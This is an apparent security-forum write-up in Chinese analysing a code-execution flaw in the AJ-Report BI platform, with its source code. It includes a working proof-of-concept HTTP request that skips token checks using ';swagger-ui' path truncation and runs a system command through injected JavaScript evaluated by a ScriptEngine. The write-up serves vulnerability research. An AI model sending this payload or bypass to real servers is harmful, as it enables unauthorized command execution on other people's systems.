# AJ-Report代码执行漏洞分析

> **来源**: https://forum.butian.net/share/2969  
> **文章ID**: 2969

---

AJ-Report代码执行漏洞分析
=================

AJ-Report是全开源的一个BI平台，`DataSetParamController` 中`verification`方法未对传入的参数进行过滤，可以执行JavaScript函数，导致命令执行漏洞。

环境搭建
----

将源码下并使用IDEA打开

git clone <https://gitee.com/anji-plus/report.git>

![image-20240504154116752](images/attach-27d6f1cf3afc6fdee647c98beecbbf217eecc8c4.png)

### 配置mysql

创建数据 aj\_report ，数据库sql文件在resources/db.migration 目录下

![image-20240504154241700](images/attach-369b07230fc3556d7a076abae0a484932a4e5c63.png)

配置文件存储路径

![image-20240504154329937](images/attach-4fcbd46bbc026b4519cf2e0d9c78d8eff88e2b8e.png)

漏洞复现
----

```php
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1  
Host: 192.168.0.100:9095  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Content-Type: application/json;charset=UTF-8  
Connection: close  
​  
{"sampleItem":"1","validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\\"whoami\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

![image-20240504155259256](images/attach-477bb6e64fe5c3bd95c5d05d501e12551470709d.png)

![image-20240504155319624](images/attach-2909672ae6ade71ea975f824bf0d340d7e08c2c8.png)

代码分析
----

### 漏洞路径

`\report\report-core\src\main\java\com\anjiplus\template\gaea\business\modules\datasetparam\controller\DataSetParamController.java`

#### verification

```java
    @PostMapping("/verification")  
    public ResponseBean verification(@Validated @RequestBody DataSetParamValidationParam param) {  
        DataSetParamDto dto \= new DataSetParamDto();  
        dto.setSampleItem(param.getSampleItem());  
        dto.setValidationRules(param.getValidationRules());  
        return responseSuccessWithData(dataSetParamService.verification(dto));  
    }
```

param 接受传入的值

```java
@Data  
public class DataSetParamValidationParam implements Serializable {  
​  
    /\*\* 参数示例项 \*/  
    @NotBlank(message \= "sampleItem not empty")  
    private String sampleItem;  
​  
​  
    /\*\* js校验字段值规则，满足校验返回 true \*/  
    @NotBlank(message \= "validationRules not empty")  
    private String validationRules;  
}
```

需要接受的参数 `sampleItem` ，`validationRules`

并将这个参数传入`dataSetParamService.verification(dto)`

![image-20240504155856186](images/attach-13df1dae9c8548e3406009ee18a95832e1ff5700.png)

#### DataSetParamServiceImpl.java

该类中实现了 verification 方法

```java

package com.anjiplus.template.gaea.business.modules.datasetparam.service.impl;  
​  
import com.anji.plus.gaea.curd.mapper.GaeaBaseMapper;  
import com.anji.plus.gaea.exception.BusinessExceptionBuilder;  
import com.anjiplus.template.gaea.business.modules.datasetparam.controller.dto.DataSetParamDto;  
import com.anjiplus.template.gaea.business.modules.datasetparam.dao.DataSetParamMapper;  
import com.anjiplus.template.gaea.business.modules.datasetparam.dao.entity.DataSetParam;  
import com.anjiplus.template.gaea.business.modules.datasetparam.service.DataSetParamService;  
import com.anjiplus.template.gaea.business.modules.datasetparam.util.ParamsResolverHelper;  
import com.anjiplus.template.gaea.business.code.ResponseCode;  
import com.fasterxml.jackson.databind.ObjectMapper;  
import lombok.extern.slf4j.Slf4j;  
import org.apache.commons.lang3.StringUtils;  
import org.springframework.beans.factory.annotation.Autowired;  
import org.springframework.stereotype.Service;  
​  
import javax.script.Invocable;  
import javax.script.ScriptEngine;  
import javax.script.ScriptEngineManager;  
import java.util.HashMap;  
import java.util.List;  
import java.util.Map;  
​  
/\*\*  
\* @desc DataSetParam 数据集动态参数服务实现  
\* @author Raod  
\* @date 2021-03-18 12:12:33.108033200  
\*\*/  
@Service  
//@RequiredArgsConstructor  
@Slf4j  
public class DataSetParamServiceImpl implements DataSetParamService {  
​  
    private ScriptEngine engine;  
    {  
        ScriptEngineManager manager \= new ScriptEngineManager();  
        engine \= manager.getEngineByName("JavaScript");  
    }  
​  
    @Autowired  
    private DataSetParamMapper dataSetParamMapper;  
​  
    @Override  
    public GaeaBaseMapper<DataSetParam\> getMapper() {  
      return dataSetParamMapper;  
    }  
​  
    /\*\*  
     \* 参数替换  
     \*  
     \* @param contextData  
     \* @param dynSentence  
     \* @return  
     \*/  
    @Override  
    public String transform(Map<String, Object\> contextData, String dynSentence) {  
        if (StringUtils.isBlank(dynSentence)) {  
            return dynSentence;  
        }  
        if (dynSentence.contains("${")) {  
            dynSentence \= ParamsResolverHelper.resolveParams(contextData, dynSentence);  
        }  
        if (dynSentence.contains("${")) {  
            throw BusinessExceptionBuilder.build(ResponseCode.INCOMPLETE\_PARAMETER\_REPLACEMENT\_VALUES, dynSentence);  
        }  
        return dynSentence;  
    }  
​  
    /\*\*  
     \* 参数替换  
     \*  
     \* @param dataSetParamDtoList  
     \* @param dynSentence  
     \* @return  
     \*/  
    @Override  
    public String transform(List<DataSetParamDto\> dataSetParamDtoList, String dynSentence) {  
        Map<String, Object\> contextData \= new HashMap<>();  
        if (null \== dataSetParamDtoList || dataSetParamDtoList.size() <= 0) {  
            return dynSentence;  
        }  
        dataSetParamDtoList.forEach(dataSetParamDto \-> {  
            contextData.put(dataSetParamDto.getParamName(), dataSetParamDto.getSampleItem());  
        });  
        return transform(contextData, dynSentence);  
    }  
​  
    /\*\*  
     \* 参数校验  js脚本  
     \*  
     \* @param dataSetParamDto  
     \* @return  
     \*/  
    @Override  
    public Object verification(DataSetParamDto dataSetParamDto) {  
​  
        String validationRules \= dataSetParamDto.getValidationRules();  
        if (StringUtils.isNotBlank(validationRules)) {  
            try {  
                engine.eval(validationRules);  
                if(engine instanceof Invocable){  
                    Invocable invocable \= (Invocable) engine;  
                    Object exec \= invocable.invokeFunction("verification", dataSetParamDto);  
                    ObjectMapper objectMapper \= new ObjectMapper();  
                    if (exec instanceof Boolean) {  
                        return objectMapper.convertValue(exec, Boolean.class);  
                    }else {  
                        return objectMapper.convertValue(exec, String.class);  
                    }  
​  
                }  
​  
            } catch (Exception ex) {  
                throw BusinessExceptionBuilder.build(ResponseCode.EXECUTE\_JS\_ERROR, ex.getMessage());  
            }  
​  
        }  
        return true;  
    }  
​  
    /\*\*  
     \* 参数校验  js脚本  
     \*  
     \* @param dataSetParamDtoList  
     \* @return  
     \*/  
    @Override  
    public boolean verification(List<DataSetParamDto\> dataSetParamDtoList, Map<String, Object\> contextData) {  
        if (null \== dataSetParamDtoList || dataSetParamDtoList.size() \== 0) {  
            return true;  
        }  
​  
        for (DataSetParamDto dataSetParamDto : dataSetParamDtoList) {  
            if (null != contextData) {  
                String value \= contextData.getOrDefault(dataSetParamDto.getParamName(), "").toString();  
                dataSetParamDto.setSampleItem(value);  
            }  
​  
            Object verification \= verification(dataSetParamDto);  
            if (verification instanceof Boolean) {  
                if (!(Boolean) verification) {  
                    return false;  
                }  
            }else {  
                //将得到的值重新赋值给contextData  
                if (null != contextData) {  
                    contextData.put(dataSetParamDto.getParamName(), verification);  
                }  
                dataSetParamDto.setSampleItem(verification.toString());  
            }  
​  
        }  
        return true;  
    }  
​  
}  
​
```

##### verification

```java
   @Override  
    public Object verification(DataSetParamDto dataSetParamDto) {  
​  
        String validationRules \= dataSetParamDto.getValidationRules();  
        if (StringUtils.isNotBlank(validationRules)) {  
            try {  
                engine.eval(validationRules);  
                if(engine instanceof Invocable){  
                    Invocable invocable \= (Invocable) engine;  
                    Object exec \= invocable.invokeFunction("verification", dataSetParamDto);  
                    ObjectMapper objectMapper \= new ObjectMapper();  
                    if (exec instanceof Boolean) {  
                        return objectMapper.convertValue(exec, Boolean.class);  
                    }else {  
                        return objectMapper.convertValue(exec, String.class);  
                    }  
​  
                }  
​  
            } catch (Exception ex) {  
                throw BusinessExceptionBuilder.build(ResponseCode.EXECUTE\_JS\_ERROR, ex.getMessage());  
            }  
​  
        }  
        return true;  
    }
```

```java
    private ScriptEngine engine;  
    {  
        ScriptEngineManager manager \= new ScriptEngineManager();  
        engine \= manager.getEngineByName("JavaScript");  
    }
```

`engine.eval(validationRules)`: 这行代码使用了一个 `engine`是 `ScriptEngine` 的一个实例，来执行传入的 `validationRules` 字符串，即执行一段 JavaScript 代码。

`if(engine instanceof Invocable)` 这里检查 `engine` 是否是 `Invocable` 接口的实例，如果是，表示这个引擎可以调用 JavaScript 函数。

`invocable.invokeFunction("verification", dataSetParamDto)`: 如果引擎可以调用，就调用名为 `"verification"` 的 JavaScript 函数，并传入一个 `dataSetParamDto` 对象作为参数。

`ObjectMapper objectMapper = new ObjectMapper()`: 创建了一个`ObjectMapper`对象，用于处理 JSON 数据。

```java
 if (exec instanceof Boolean) {  
    return objectMapper.convertValue(exec, Boolean.class);  
  }else {  
     return objectMapper.convertValue(exec, String.class);  
 }
```

根据 `exec` 对象的类型进行处理，如果是布尔类型，则将其转换为 Java 中的 Boolean 类型；否则转换为 String 类型。

`return objectMapper.convertValue(...)`: 最后，根据 `exec` 的类型，使用 ObjectMapper 将其转换成相应的 Java 类型，并返回结果。

### debug 调试

下断点

![image-20240504161034272](images/attach-d10959676eaeee0394fe16437646c27a9b875e4a.png)

`validationRules` 值为JavaScript 代码

调用了`ScriptEngineManager` eval执行JavaScript 代码

![image-20240504161337300](images/attach-1e07ae50358674738ac59b9d1d8fad2adf784fae.png)

### 权限验证

正常访问 `/dataSetParam/verification` 路由是需要token验证

![image-20240504162128661](images/attach-0fdaae5223a9ac69ccd1a80aceed748e77659f7b.png)

搜索 `The Token has expired`

![image-20240504162204818](images/attach-c2832c350fc8218f9c79d655374dcc2f749a13dd.png)

#### TokenFilter.java

`TokenFilter`拦截器中，放行`swagger-ui`，`swagger-resources`

```php
if (uri.contains("swagger-ui") || uri.contains("swagger-resources")) {  
    filterChain.doFilter(request, response);  
    return;  
}
```

![image-20240504162300629](images/attach-1d6ad9257d5089b79343238558514343e73b5444.png)

#### 使用URL截断绕过 ;

`swagger-ui`，`swagger-resources`

```php
POST /dataSetParam/verification;swagger-ui HTTP/1.1  

POST /dataSetParam/verification;swagger-resources HTTP/1.1
```

![image-20240504163359548](images/attach-e995d457cb716fbfb4e3ca99af41ce4f12dcf400.png)

![image-20240504163422237](images/attach-5984c424049b737c0fc91bb593862befbe28f54b.png)

![image-20240504163434179](images/attach-6dc5617d3dda916c07028fdc9727467922f0f772.png)

### 总结

- verification方法传入参数`validationRules`，调用了`ScriptEngineManager` eval执行JavaScript 代码，导致的代码执行漏洞。
- 使用`;` 绕过鉴权
